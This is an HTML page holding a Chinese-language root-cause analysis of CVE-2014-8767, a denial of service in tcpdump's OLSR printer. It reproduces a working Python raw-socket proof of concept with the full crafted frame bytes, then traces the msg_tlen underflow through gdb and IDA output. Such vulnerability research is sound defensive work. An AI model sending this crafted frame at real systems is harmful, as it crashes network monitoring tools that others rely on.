<!DOCTYPE html>
<html>
<head>
<title>CVE-2014-8767 Tcpdump 4.6.2 OSLR Denial Of Service Vulnerability</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="cve-2014-8767-tcpdump-4-6-2-oslr-denial-of-service-vulnerability">CVE-2014-8767 Tcpdump 4.6.2 OSLR Denial Of Service Vulnerability</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<p>从这个CVE开始，接连着三个都是同一类型的，从命名来看，应该是漏洞发现者用工具fuzzing出来的Crash，这三个CVE分别是</p>
<ul>
<li>CVE-2014-8767 Tcpdump 4.6.2 OSLR Denial Of Service Vulnerability</li><li>CVE-2014-8768 Tcpdump 4.6.2 Geonet Denial Of Service Vulnerability</li><li>CVE-2014-8769 Tcpdump 4.6.2 AOVD Unreliable Output Vulnerability</li></ul>
<p>接下来这三个漏洞都会分别进行分析</p>
<p>作者给出的Poc以及简单的分析</p>
<ul>
<li><a href="http://www.expku.com/dos/4385.html">http://www.expku.com/dos/4385.html</a></li></ul>
<p>我省略一些不必要的</p>
<pre><code>The application decoder for the OLSR protocol fails to perform external 
input validation and performs insufficient checking on length 
computations leading to an unsafe decrement and underflow in the function

olsr_print (const u_char *pptr, u_int length, int is_ipv6)

In this function msg_len is extracted from the input without sufficient 
checks and subtracted sizeof(struct olsr_msg4) which leads to an 
underflow of msg_tlen which is used to call olsr_print_neighbor() which 
will crash. In case DNS reverse lookup is enabled, this will also lead 
to a large amount of invalid DNS reverse lookups.

To reproduce start tcpdump on a network interface

sudo tcpdump -i lo -s 0 -n -v

(running the program with sudo might hide the segfault message on 
certain environments, see dmesg for details)

and use the following python program to generate a frame on the network 
(might also need sudo):

#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((&quot;lo&quot;, 0))

olsr_frame = 
&quot;\x00\x1b\xc6\x51\x35\x97\x00\x24\x8c\x7a\xff\x6f\x08\x00\x45\x15\x00\x3d\xf3\x7f\x40\x00\x4d\x11\x30\xc6\x0a\x01\x01\x68\x0a\x02\x02\x02\x02\xba\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x20\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x20\x01\x00\x00\x00&quot;

s.send(olsr_frame)

4. Affected versions
Affected versions are 3.9.6 through 4.6.2

5. Fix
The problem is fixed in the upcoming version tcpdump 4.7.0
</code></pre><p>在详细模式下会触发该拒绝服务，所以我们来复现一下</p>
<p>该漏洞影响<code>3.9.6 - 4.6.2</code>，我们这里使用<code>4.5.1</code>，下载及编译参考</p>
<ul>
<li><a href="http://couplee.wang/Linux/TCPDump%204.5.1%20Denial%20Of%20Service%20Vulnerability/article.html">TCPDump 4.5.1 Denial Of Service Vulnerability</a></li></ul>
<p>使用作者提供的启动方式启动，不过网卡接口要根据自己的机子做适当修改</p>
<pre><code>wnagzihxain@toT0C:~$ sudo tcpdump -i ens33 -s 0 -n -v
</code></pre><p>修改Poc的网卡接口为自己测试系统的网卡接口，直接在同一个系统中运行</p>
<pre><code>wnagzihxain@toT0C:~$ cat Poc.py 
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((&quot;ens33&quot;, 0))

olsr_frame = &quot;\x00\x1b\xc6\x51\x35\x97\x00\x24\x8c\x7a\xff\x6f\x08\x00\x45\x15\x00\x3d\xf3\x7f\x40\x00\x4d\x11\x30\xc6\x0a\x01\x01\x68\x0a\x02\x02\x02\x02\xba\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x20\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x20\x01\x00\x00\x00&quot;

s.send(olsr_frame)
</code></pre><p>跑起来，会看到很多输出，然后崩溃</p>
<p><img src="Image/1.png" alt=""></p>
<p>到这里测试了Poc有效，接下来我们使用gdb调试</p>
<pre><code>wnagzihxain@toT0C:~$ sudo gdb tcpdump
</code></pre><p>设置参数</p>
<pre><code>gdb-peda$ set args -i ens33 -s 0 -n -v
</code></pre><p>跑起来，一大堆输出后断下来</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0xb7fbe000 
EBX: 0x8114881 --&gt; 0x73250020 (&#39; &#39;)
ECX: 0x7ffffff7 
EDX: 0xb7dcf870 --&gt; 0x0 
ESI: 0x2 
EDI: 0x202 
EBP: 0xbfffdf38 --&gt; 0xbfffdf68 --&gt; 0xbfffe098 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 (--&gt; ...)
ESP: 0xbfffdf10 --&gt; 0x2 
EIP: 0x804a5bb (&lt;getname+28&gt;:    mov    eax,DWORD PTR [eax])
EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a5b3 &lt;getname+20&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x804a5b6 &lt;getname+23&gt;:    xor    eax,eax
   0x804a5b8 &lt;getname+25&gt;:    mov    eax,DWORD PTR [ebp-0x1c]
=&gt; 0x804a5bb &lt;getname+28&gt;:    mov    eax,DWORD PTR [eax]
   0x804a5bd &lt;getname+30&gt;:    mov    DWORD PTR [ebp-0x14],eax
   0x804a5c0 &lt;getname+33&gt;:    mov    eax,DWORD PTR [ebp-0x14]
   0x804a5c3 &lt;getname+36&gt;:    and    eax,0xfff
   0x804a5c8 &lt;getname+41&gt;:    mov    edx,eax
[------------------------------------stack-------------------------------------]
0000| 0xbfffdf10 --&gt; 0x2 
0004| 0xbfffdf14 --&gt; 0x202 
0008| 0xbfffdf18 --&gt; 0xbfffdf68 --&gt; 0xbfffe098 --&gt; 0xbfffe0f8 --&gt; 0xbfffe148 --&gt; 0xbfffe1c8 (--&gt; ...)
0012| 0xbfffdf1c --&gt; 0xb7fbe000 
0016| 0xbfffdf20 --&gt; 0xb7dced60 --&gt; 0xfbad2a84 
0020| 0xbfffdf24 --&gt; 0x8114883 (&quot;%s%s&quot;)
0024| 0xbfffdf28 --&gt; 0xbfffdf4c --&gt; 0xb7c65696 (&lt;__printf+38&gt;:    add    esp,0x1c)
0028| 0xbfffdf2c --&gt; 0xfd74a100 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0804a5bb in getname ()
</code></pre><p>断下来后，我们观察到下断的指令是读取<code>eax</code>寄存器指向地址的值</p>
<pre><code>=&gt; 0x804a5bb &lt;getname+28&gt;:    mov    eax,DWORD PTR [eax]
</code></pre><p>尝试读取，发现不可读，那么问题就清楚了，应该是读取了不可读的内存导致的崩溃</p>
<pre><code>gdb-peda$ x/x $eax
0xb7fbe000:    Cannot access memory at address 0xb7fbe000
</code></pre><p>回溯函调用栈</p>
<pre><code>gdb-peda$ bt
#0  0x0804a5bb in getname ()
#1  0x0808cbd2 in olsr_print_neighbor ()
#2  0x0808d486 in olsr_print ()
#3  0x080bcad7 in udp_print ()
#4  0x08073540 in ip_print_demux ()
#5  0x08073e59 in ip_print ()
#6  0x0806abd9 in ethertype_print ()
#7  0x0806a8b2 in ether_print ()
#8  0x0806a951 in ether_if_print ()
#9  0x080c2c7f in print_packet ()
#10 0x080ef63e in pcap_handle_packet_mmap (handle=handle@entry=0x8235058, 
    callback=callback@entry=0x80c2c13 &lt;print_packet&gt;, 
    user=user@entry=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;, frame=0xb7a16030 &quot;&quot;, tp_len=0x4b, 
    tp_mac=0x56, tp_snaplen=0x4b, tp_sec=0x5a4c4e2b, tp_usec=0xb0fd7, 
    tp_vlan_tci_valid=0x0, tp_vlan_tci=0x0) at ./pcap-linux.c:4264
#11 0x080f3884 in pcap_read_linux_mmap_v3 (handle=0x8235058, max_packets=0xffffffff, 
    callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;)
    at ./pcap-linux.c:4429
#12 0x080d9da9 in pcap_loop (p=0x8235058, cnt=&lt;optimized out&gt;, 
    callback=0x80c2c13 &lt;print_packet&gt;, user=0xbfffe46c &quot; :#\b+\251\006\b\001&quot;)
    at ./pcap.c:856
#13 0x080c2229 in main ()
#14 0xb7c34637 in __libc_start_main (main=0x80c083a &lt;main&gt;, argc=0x7, argv=0xbffff654, 
    init=0x80f7300 &lt;__libc_csu_init&gt;, fini=0x80f7360 &lt;__libc_csu_fini&gt;, 
    rtld_fini=0xb7fea8a0 &lt;_dl_fini&gt;, stack_end=0xbffff64c) at ../csu/libc-start.c:291
#15 0x0804a3d3 in _start ()
</code></pre><p>使用IDA分析，函数是<code>getname()</code>，我们直接搜索定位，其实我们读取的指针就是传进去的参数</p>
<pre><code>.text:0804A5A7 mov     eax, [ebp+arg_0]
.text:0804A5AA mov     [ebp+var_1C], eax
.text:0804A5AD mov     eax, large gs:14h
.text:0804A5B3 mov     [ebp+var_C], eax
.text:0804A5B6 xor     eax, eax
.text:0804A5B8 mov     eax, [ebp+var_1C]
.text:0804A5BB mov     eax, [eax]      ; 漏洞触发点：读取不可读内存
</code></pre><p>先将参数保存在栈中，然后是栈溢出保护，接着清空了<code>eax</code>寄存器的值，然后把参数从栈中取出，这个值指向的内存不可读，造成崩溃，我们找到其交叉引用</p>
<p>我们在上述调试中直接的引用是<code>olsr_print_neighbor()</code>，所以直接找到它，它只是将自身的一个指针传给了漏洞函数，关键就是这个指针</p>
<pre><code>.text:0808CBCA push    [ebp+arg_0]
.text:0808CBCD call    getname
</code></pre><p>继续往回找，在<code>olsr_print()</code>中，它虽然有两个参数，但是只有传入的第一个指针是有用的，就是这个指针最后导致的不可读</p>
<pre><code>.text:0808D475 push    [ebp+var_E8]
.text:0808D47B push    [ebp+var_DC]
.text:0808D481 call    olsr_print_ne
</code></pre><p>然后这个指针来源就很复杂了，各种计算，但是可以看到漏洞的触发大概就是从这个函数开始的</p>
<p>我们查看其源码，源码很长，不全部贴出来，有两处进行调用，但是第一个都是数据的起始地址，猜测这是根据叠加偏移等计算出的<code>msg_data</code>指针</p>
<pre><code>olsr_print_neighbor(msg_data, hello_len);
olsr_print_neighbor(msg_data, msg_tlen);
</code></pre><p>该文件最开始有一个结构示意图，一个头部，后面跟着n个Message</p>
<pre><code>/*
 * RFC 3626 common header
 *
 *  0                   1                   2                   3
 *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |         Packet Length         |    Packet Sequence Number     |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |  Message Type |     Vtime     |         Message Size          |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |                      Originator Address                       |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |  Time To Live |   Hop Count   |    Message Sequence Number    |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |                                                               |
 * :                            MESSAGE                            :
 * |                                                               |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |  Message Type |     Vtime     |         Message Size          |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |                      Originator Address                       |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |  Time To Live |   Hop Count   |    Message Sequence Number    |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * |                                                               |
 * :                            MESSAGE                            :
 * |                                                               |
 * +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * :                                                               :
 */
</code></pre><p>我们结合代码来分析，只截取关键的赋值代码</p>
<pre><code>tptr = pptr; // tptr为消息指针
tptr += sizeof(struct olsr_common); // 跳过了第一个4字节
</code></pre><p>第一个4直接数据结构体，对应着上述结构的前两个字段</p>
<pre><code>struct olsr_common {
    u_int8_t packet_len[2];
    u_int8_t packet_seq[2];
};
</code></pre><p>进入一个循环，先定义一个结构体，这是因为传进去的数据有<code>ipv4</code>和<code>ipv6</code>的区别</p>
<pre><code>union
{
    struct olsr_msg4 *v4;
    struct olsr_msg6 *v6;
} msgptr;
</code></pre><p>此处我们以<code>olsr_msg4</code>为例，通过指针类型转换获取到对象</p>
<pre><code>msgptr.v4 = (struct olsr_msg4 *) tptr;
msg_type = msgptr.v4-&gt;msg_type;
msg_len = EXTRACT_16BITS(msgptr.v4-&gt;msg_len);
</code></pre><p>该结构体对应的成员</p>
<pre><code>struct olsr_msg4 {
    u_int8_t msg_type;
    u_int8_t vtime;
    u_int8_t msg_len[2];
    u_int8_t originator[4];
    u_int8_t ttl;
    u_int8_t hopcount;
    u_int8_t msg_seq[2];
};
</code></pre><p>注意到第三个字段<code>msg_len</code>，在进行结构体对应字段的获取后，直接减去头部的长度，作为Message的长度</p>
<pre><code>msg_tlen = msg_len - sizeof(struct olsr_msg4);
msg_data = tptr + sizeof(struct olsr_msg4);
</code></pre><p>接着传入</p>
<pre><code>olsr_print_neighbor(msg_data, hello_len);
</code></pre><p>可以看到并没有判断指针指向的内存是否可读，直接进行循环读取操作，最终触发在<code>ipaddr_string(msg_data)</code>函数里</p>
<pre><code>/*
 * print a neighbor list.
 */
static void
olsr_print_neighbor (const u_char *msg_data, u_int hello_len)
{
    int neighbor;

    printf(&quot;\n\t      neighbor\n\t\t&quot;);
    neighbor = 1;

    while (hello_len &gt;= sizeof(struct in_addr)) {

        /* print 4 neighbors per line */

        printf(&quot;%s%s&quot;, ipaddr_string(msg_data),
               neighbor % 4 == 0 ? &quot;\n\t\t&quot; : &quot; &quot;);

        msg_data += sizeof(struct in_addr);
        hello_len -= sizeof(struct in_addr);
    }
}
</code></pre><p>我们进行调试，来确定作者的Poc构造，先下个断点</p>
<pre><code>gdb-peda$ b olsr_print
</code></pre><p>跑起来，这就是传入的<code>pptr</code>指向的数据（不是全部）</p>
<pre><code>gdb-peda$ x/30x $eax
0xb7a56348:    0x02020202    0x02002002    0x02020202    0x02020202
0xb7a56358:    0x02020202    0x02020202    0x02020202    0x00000120
0xb7a56368:    0x00000000    0x00000000    0x00000110    0x5a4cb3b7
0xb7a56378:    0x09177942    0x000000b7    0x000000b7    0x00000001
0xb7a56388:    0x00640056    0x00000000    0x00000000    0x00000000
0xb7a56398:    0x00000000    0x00000000    0x00080011    0x00000002
0xb7a563a8:    0x06040001    0x07290c00    0x0000e015    0x00000000
0xb7a563b8:    0x00000000    0x00000000
</code></pre><p>我们进行对应</p>
<pre><code>Packet Length : \x02\x02
Packet Sequence Number : \x02\x02
Message Type : \x02
Vtime : \x20
Message Size : \x00\x02
Originator Address : \x02\x02\x02\x02
Time To Live : \x02
Hop Count : \x02
Message Sequence Number : \x02\x02
MESSAGE : \x02\x02\x02\x02
\x02\x02\x02\x02
\x02\x02\x20\x02
\x01\x00\x00\x00
</code></pre><p>注意作者设置的<code>msg_type</code>字段为<code>\x02</code>，这个在代码中的定义是<code>OLSR_TC_MSG</code></p>
<pre><code>#define OLSR_HELLO_MSG         1 /* rfc3626 */
#define OLSR_TC_MSG            2 /* rfc3626 */
#define OLSR_MID_MSG           3 /* rfc3626 */
#define OLSR_HNA_MSG           4 /* rfc3626 */
#define OLSR_POWERINFO_MSG   128
#define OLSR_NAMESERVICE_MSG 130
#define OLSR_HELLO_LQ_MSG    201 /* LQ extensions olsr.org */
#define OLSR_TC_LQ_MSG       202 /* LQ extensions olsr.org */
</code></pre><p>后面通过<code>switch/case</code>来控制，这里就会进行触发</p>
<pre><code>if (msg_type == OLSR_TC_MSG) {
    olsr_print_neighbor(msg_data, msg_tlen);
} else {
</code></pre><p>上面就是完整的触发过程</p>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="http://www.expku.com/dos/4385.html">http://www.expku.com/dos/4385.html</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
